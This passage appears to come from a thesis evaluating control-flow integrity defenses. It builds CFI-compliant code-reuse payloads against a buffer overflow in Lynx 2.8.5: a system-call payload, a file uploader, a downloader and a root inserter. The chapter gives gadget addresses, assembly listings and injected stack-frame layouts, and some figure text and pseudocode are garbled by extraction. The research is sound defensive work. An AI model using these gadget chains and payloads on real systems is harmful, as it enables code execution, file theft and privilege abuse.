PE binaries which hold direct jumps to indirect transfer targets. To distinguish between
calls and returns, addresses for the entries holding call targets are 8 byte aligned but not
16 byte aligned and return targets are 16 byte aligned. In the original code, indirect calls
50
and returns are rewritten to include checks which ensure that the target is located within
the appropriate region of the springboard section. For additional protection, CCFIR also
distinguishes between returns into sensitive functions and returns into normal functions.
Springboard section entries for returns into normal functions will have 0 in the 26th bit of
the address and 1 for returns into sensitive functions. The return address checks for func-
tions that are not called by the sensitive functions also ensure that the 26th bit of the return
address is 0.
Zhang et al. use a disassembler in conjunction with information from address relocation
tables included in PE binaries to identify call sites and indirect jump targets. Relocation
tables have entries for both code and data, so the disassembler uses recursive disassembly
to distinguish between pointers to code and data in the relocation tables and ensure that the
indirect jump targets in the Springboard sections only point to code.
5.1.2 Control Flow Integrity
Abadi et al. [2] propose a binary instrumentation system which uses identiﬁer strings to
match control transfers and targets. Each transfer and valid target is tagged with a 32-bit
identiﬁer. Right before each control transfer, the instrumentation code fetches the identiﬁer
string from the target location and checks that it matches the identifer from the transfer
location.
Any transfers with overlapping sets of destinations are regarded as equivalent assigned
the same identiﬁer. This means that a bad over-approximation of the call graph can create
even more extraneous edges than in other systems because transfers that would have been
distinct in a better approximation of the graph are merged. Abadi et al. do not provide
speciﬁc details about how they generate the call graph, so it is not clear how many distinct
identiﬁers typical programs have.
5.2 Control Flow Graph Model
The control ﬂow through a function and the control ﬂow between functions in a program
can both be represented as graphs [3]. These graphs can be combined into a supergraph
51
which contains all of the possible control transfers in a program. The nodes in the graph
are the basic blocks from the function control ﬂow graph, which are straight-line code
sequences with one entry point and one exit point. Calls and returns are represented by
additional edges in the graph. Figure 5-1 shows an example of a control ﬂow supergraph
for a bubble sort function. The graph includes both the control ﬂow within functions and
the function calls and returns. The pseudocode for the sort algorithm is as follows:
Function: sort(list,length):
while(!sorted(list, length))
i=0
while(i  list[i+1])
tmp = list[i]
list[i] = list[i+1]
list[i+1] = tmp
i++
return list
Function: sorted(list, length)
i = 0
while(i  list[i+1])
return false
return true
It is possible to create an approximation of this graph using static analysis techniques.
Traditional disassemblers [17] can identify code sections and determine the control ﬂow
based on direct jumps, but identifying the targets of indirect jumps is undecidable. Some
systems use relocation tables [47] to identify all potential targets, but these tables will have
relocation entries for every function that is called with direct calls as well as indirect calls.
Data ﬂow analysis tools [25] [24] can sometimes provide better approximations, but tech-
52
Figure 5-1: Control ﬂow graph for sort
53
while(i list[i+1])i++Function: sorted( list, length):while(i list[i+1])returnfalsereturntruei++while(!sorted(list,length))i=0i=0niques which over-approximate rather than under-approximate (to avoid false positives)
still produce many excess edges.
We build a control ﬂow graph with some modiﬁcations, which we combine with search
algorithms to model the potential paths that an attacker could take through the program.
The modiﬁcations take into consideration the fact that an attacker with control of the stack
can inject forged stack frames and modify return addresses. This requires considering
extra edges in the call graph because normally, program control ﬂow analysis assumes that
programs follow normal calling conventions where functions only return to the line they
were called from and there is a one-to-one relationship between calls and returns. However,
when attackers are able to inject stack frames as part of their payload, this one-to-one
relationship does not always apply. When an attacker has overwritten a return address
and injected a stack frame, they can force the program to return to any valid return target,
which may lead to another return. This allows attackers to chain together multiple returns
in a row without making corresponding calls. The graph we build includes edges for all the
indirect transfers allowed by the CFI system we are investigating in addition to the edges
corresponding to direct transfers.
5.3 Interactive Search
We analyze the control ﬂow supergraph using a depth-ﬁrst search algorithm to determine
what code is reachable by an attacker who has found a buffer overﬂow vulnerability that
makes it possible to divert the program control ﬂow and aid in building code reuse payloads
that work in the presence of CFI. Our search tool takes as input the location of the buffer
overﬂow as well as a list of gadgets (basic blocks from the program) to execute and outputs
a path through the program that executes each gadget while only following edges allowed
by the control ﬂow enforcement system.
The resulting paths are a list of edges that are allowed by the CFI system that an attacker
can use to reach the gadgets they want to call. Figure 5-2 shows an example of one such
path. In this example, the attacker has overwritten a return address in one function, and
wants to call execv. The search follows valid return edges until it ﬁnds a gadget that calls
54
Figure 5-2: Search from a vulnerable function to a call of execv
execv.
5.3.1 Data Dependent Edges
Many of the edges in the graph will depend on the program state. Rather than perform data
ﬂow analysis to determine which edges the attacker is able to traverse, the graph search will
initially assume that all the edges are valid. If it ﬁnds a path that is not actually possible
given the parts of the data that the user can control, the user is given the option to manually
delete edges and recalculate the paths. In the less likely scenario that an edge is missing,
users can also add edges and recalculate the paths. This interactivity ensures that the search
55
Vulnerability: Overwrittenreturnaddressgadget code…returngadget code…returngadget code…returncall sitesfor vulnerable functiongadget codecall execvexecvcall sitesfor gadgetswill ﬁnd the real paths despite the existence of paths that do not exist caused by using an
over-approximation of the control ﬂow graph.
5.3.2 Edge Constraints
Our graph includes edges between returns and call sites as allowed by the deployed CFI.
However, it is not always possible to follow all of these edges. If the attacker has control of
the stack frame at the time the return is executed, then they can specify any valid return ad-
dress. On the other hand, if the return was reached via a normal function call and execution,
then the attacker does not have control of the return address, (because it was pushed onto
the stack after the payload was injected) and the return will necessarily go to the function
that called it. To facilitate tracking these constraints, call and return edges in the graph are
labelled with the type of edge and an identiﬁer corresponding to the particular call/return
pair. As paths are built, the search maintains a list of the calls that have not been matched
with a return. When this list is not empty, the only return edge that the search can follow is
the one that matches the most recent call. This simulates the call stack that is created in the
program by the actual attack.
The presence of the call stack requires a modiﬁcation to the cycle detection part of the
search algorithm. Normally, the path taken to arrive at a particular node does not affect
the paths that can lead from that node, so any path that visits the same node more than
once has a cycle and does not need to be explored further. In this case, the path taken to
a particular node does matter, because the call stack affects the return edges that can be
followed later. To account for this, instead of regarding a path as containing a cycle when
a node has been visited more than once, the cycle detection algorithm also checks the call
stack for repeated nodes. If the same node is visited twice and the call stacks are the same
or one call stack is a preﬁx of the other, the paths to that node are equivalent and the longer
one can be discarded; otherwise the paths are different and both are kept.
56
Chapter 6
CFI-Safe Attacks
In this chapter, we demonstrate that the CFG enforced by the CFI system proposed by
Zhang et al.
(called CCFIR) [47] is not restrictive enough to prevent actual attacks by
building several practical code reuse attacks (calling system, a ﬁle uploader and down-
loader and a root inserter) that only use control transfers allowed by their defense. The
payloads themselves are for Lynx, a text based browser, but the techniques we use to de-
velop them would be applicable to more applications. These techniques also potentially
apply to other CFI systems; CCFIR is chosen because it provides the most clear descrip-
tion of the enforced call graph.
6.1 Threat Model and Assumptions
We assume that the attacker knows about a vulnerability that allows them to write a payload
into memory and overwrite some control ﬂow data (return address or function pointer). We
also assume that the attacker knows the content of the process address space. Although
some form of ASLR is deployed by default in most modern operating systems [4] [33], as
mentioned in 4.2, many attacks against randomization systems exist [37] [38] [35] which
allow attackers to collect the information they need about the address space. Finally, we
assume that a CFI system is deployed and it works as described: the stated control ﬂow
graph is enforced, it is impossible to bypass the checks, and W(cid:8)X memory is strictly
enforced.
57
6.2 Test Platform
We develop our exploits for Lynx, version 2.8.5 [1], compiled with GCC version 4.6.1 and
run on Linux Mint 12. This version of Lynx has a buffer overﬂow vulnerability in the code
that processes newsgroup headers [16]. A function which adds extra escape characters to
handle kanji text uses a ﬁxed size buffer on the stack which can overﬂow into the return
address.
6.3 System Investigated
Our payloads are based on the CFG enforced by Zhang et. al. [47]. We contacted the
developers of CCFIR and requested a copy of their implementation. They did not provide
one, so instead of testing the actual system, we infer the control ﬂow graph enforced by a
CCFIR from the documentation and manually check that our payloads do not include any
edges that would not be allowed by CCFIR.
Speciﬁcally, we assume that functions can return to the instruction following any call
instruction and that function pointers can target any indirect branch target. Although their
paper does not describe in detail how they identify indirect branch targets, all of our pay-
loads use only targets that were veriﬁed in the source code as function pointer targets. Fur-
thermore, because the extent to which returns into linked libraries are distinct from returns
into the executable is not clear, our payloads only return into code from the executable.
6.4 Payload Development
While developing payloads, we treat the instructions following calls as the beginning of
gadgets, which can be chained together in a manner similar to chaining ROP gadgets. The
gadgets available in the presence of CFI consist of more instructions than the gadgets usu-
ally used in ROP attacks and some care needs to be taken to ensure that these extra in-
structions do not interfere with the attack. Often, the gadgets manipulate values stored on
the stack, either as part of operations that are useful for the payload or as side effects that
58
0x0809140f : call
0x08091414 : mov
0x08091417 : mov
0x0809141a : call
0x8084308 
-0x20(%ebp),%eax
%eax,(%esp)
0x8091536 
Figure 6-1: Assembly code to call system from LYCopyFile
cannot be avoided. Thus, our injected stack frames include initialized values as necessary
for the variables that are used in the gadget. As a concrete example, the gadget we use in
the uploader payload to write data onto the socket has the following pseudocode:
...
if spost_wanted
write to socket
...
Here, spost wanted is a value on the stack, which we initialize to true in the injected
stack frame.
6.5 Payloads
In this section, we describe our CFI-safe code reuse payloads. We implement a payload
which calls system with arbitrary arguments, an uploader, a downloader and a root in-
serter.
6.5.1 Call system
At a high level, this payload returns into the middle of a function (LYCopyFile) that calls
system with arguments from the stack. Figure 6-1 shows the assembly code that is run by
the attack. The overwritten return address points to 0x08091414, which is a valid return
address because it is an instruction immediately following a function call. The arguments
to system are copied to the bottom of the stack and then system is called. Our exploit
overwrites the stack so that the argument to system is in the correct location and overwrites
the return address. Figure 6-2 shows how the stack frame for this payload is set up.
59
Figure 6-2: Payload to call system
Code for a malicious NNTP server which injects and runs this payload is given in
Appendix B. The server is based on an example server given in the original bug report for
this vulnerability [16].
6.5.2 File Uploader and Downloader
The ﬁle uploader and downloader take advantage of the fact that the vulnerability we are
using occurs in the middle of downloading the list of messages from our malicious NNTP
server. With this vulnerability, Lynx has an open socket which is connected to our server
that it was using to download messages. The descriptor for this socket is stored in a global
variable that is used in all of the newsgroup processing code. Thus, we can implement our
payloads without opening a new socket.
Uploader
The uploader reuses the code that posts an article to a newsgroup. However, instead of
posting the temporary ﬁle that was generated by the user interface, it posts a ﬁle that was
speciﬁed by the payload. The uploader consists of two gadgets. The ﬁrst gadget is the end
of a function (InternalPageFP) which returns an integer from the stack. This gadget
60
Returnaddress: 0x08091414(LYUtils.c:6967)char*sys_args=locationofsystemargs…saved$ebp=&sys_args+ 0x20“malicious_shell_commands;”call system(sys_args) Gadget 1:
0x08090e7e : mov
0x08090e81 : leave
0x08090e82 : ret
-0xc(%ebp),%eax
Gadget 2:
0x08117580 : mov
...
0x08117881 : cmpb
0x08117885 : jne
...
0x08117899 : cmpl
0x081178a0 : je
...
0x081178c1 : mov
0x081178c4 : mov
0x081178c7 : call
%eax,-0x1c(%ebp)
$0x0,-0x34(%ebp)
0x8117899 
$0x154,-0x1c(%ebp)
0x81178c1 
-0x2c(%ebp),%eax
%eax,(%esp)
0x8110d31 
Figure 6-3: Assembly code for gadgets used by uploader
returns into the second gadget which is in the middle of the main newsgroup processing
loop after the call in the following assembly code:
call 0x0810f97f 
mov eax, -0x1c(ebp)
...
The return value from the ﬁrst gadget is stored on the stack (as the local variable status)
as though it were the result of the call to response. The second gadget processes this
result and then calls post article with a char* which is stored on the stack (and
initialized by the injected stack frame to the name of the ﬁle that is being uploaded). Then,
post article opens the ﬁle and uploads it to our NNTP server. Figure 6-3 gives the
relevant assembly code executed by the two gadgets. Figure 6-4 shows the injected stack
frame for the uploader.
61
Figure 6-4: Injected stack frame to upload a ﬁle. Pseudocode for the gadgets is given on
the right.
62
Returnaddress = 0x08090e7e(LYUtils.c:2775)…code=340Saved $ebp=&code + 0xc Saved $ebp=&spost_wanted+ 0x54 Returnaddress=0x08117580(HTNews.c:2816)spost_wanted= 1returncode;postfile= address of filenamestring …“filename”status=eaxif(status==340 andspost_wanted)    call post_article(postfile)Downloader
The downloader, which is implemented with three gadgets, reuses the code to download an
article from the server. The relevant assembly code from these gadgets is given in Figure 6-
5. The ﬁrst gadget returns a pointer to a string containing the name of the ﬁle to write. This
value is used by the second gadget, which opens the ﬁle creates and returns an HTFWriter
object. The third gadget stores the result in the global variable rawtarget and then calls
read article which reads the next article from the connected NNTP server (our server)
and copies the data to the ﬁle pointer in rawtarget. Figure 6-6 shows the stack frame
used by the downloader.
6.5.3 Root Inserter
To implement the root inserter, we modify the downloader payload to open the ﬁle in ap-
pend mode rather than write mode. To acheive this, we use the functions LYReopenTemp
and LYAppendToTextFile. LYReopenTemp calls LYAppendToTextFile and re-
turns the ﬁle pointer. We then replace the result from the call to fopen from the down-
loader with the return value from LYReopenTemp. Figure 6-7 shows the new gadgets
used by the root inserter. Figure 6-8 shows the modiﬁed section of the stack frame from
the downloader. The root inserter requires root privileges to work.
6.6 Discussion
In this chapter, we demonstrated that the CFG enforced by CCFIR [47] is not restrictive
enough to prevent practical attacks. The fact that functions are allowed to return to the
instruction following any function call created a large number of useful gadgets for an
attacker with control of the stack. Every function call was the beginning of a new gadget,
and the gadgets could be chained together using the same techniques as ROP attacks. The
available gadgets were sufﬁcient to construct practical code reuse payloads, even when we
used only code available in the Lynx executable (not linked libraries).
63
Gadget 1:
0x08090e7e : mov
0x08090e81 : leave
0x08090e82 : ret
Gadget 2:
0x080e9cda : movl
0x080e9ce2 : mov
0x080e9ce4 : mov
0x080e9ce7 : call
0x080e9cec : test
0x080e9cee : mov
0x080e9cf0 : je
0x080e9cf2 : mov
0x080e9cf5 : call
0x080e9cfa : test
0x080e9cfc : je
0x080e9cfe : mov
0x080e9d02 : mov
0x080e9d06 : mov
0x080e9d0a : add
0x080e9d0d : jmp
0x080e9d12 : lea
0x080e9d18 : xor
0x080e9d1a : mov
0x080e9d1e : mov
0x080e9d22 : add
0x080e9d25 : ret
Gadget 3:
0x081167d2 : mov
...
0x0811791f : cmpb
0x08117923 : je
...
0x081179c4 : movb
0x081179cb : movl
0x081179d2 : call
0x081179d7 : mov
0x081179da : mov
0x081179dd : call
-0xc(%ebp),%eax
$0x81562ab,0x4(%esp)
%eax,%ebx
%eax,(%esp)
0x804a380 
%ebx,%ebx
%eax,%esi
0x80e9cfa 
%ebx,(%esp)
0x8049e70 
%esi,%esi
0x80e9d18 
%esi,0x20(%esp)
0x14(%esp),%ebx
0x18(%esp),%esi
$0x1c,%esp
0x80be294 
0x0(%esi),%esi
%eax,%eax
0x14(%esp),%ebx
0x18(%esp),%esi
$0x1c,%esp
%eax,0x81960a4
$0x0,-0x21(%ebp)
0x81179c4 
$0x1,0x818e104
$0x8160653,(%esp)
0x8057839 
0xc(%ebp),%eax
%eax,(%esp)
0x811118e 
Figure 6-5: Assembly code for gadgets used by the downloader
64
Figure 6-6: Injected stack frame to download a ﬁle. Pseudocode for the gadgets is given on
the right.
65
Returnaddress = 0x080e9cda(HTFile.c:1284)…fname=“path_to_file”Saved $ebp=$ebp+8Saved $ebp=&spost_wanted+ 0x54 Returnaddress=0x081167d2(HTNews.c:2521)spost_wanted= 0list_wanted= 0rawtarget= eaxif(! (post_wanted|| reply_wanted||    spost_wanted|| sreply_wanted||    group_wanted|| list_wanted))                read_article()Returnaddress = 0x08090e7e(LYUtils.c:2775)code=&fnameSaved $ebp=&code + 0xc returncode;localname= eaxfp= fopen(localname,‘w’)returnHTFWriter_new(fp)sreply_wanted= 0post_wanted= 0reply_wanted=0group_wanted= 0Gadget 1:
0x0808fae0 : mov
0x0808fae3 : mov
0x0808fae6 : call
0x0808faeb : mov
0x0808faee : mov
0x0808faf1 : mov
0x0808faf4 : mov
0x0808faf7 : mov
0x0808fafa : mov
0x0808fafd : leave
0x0808fafe : ret
Gadget 2:
0x080e9cec : test
0x080e9cee : mov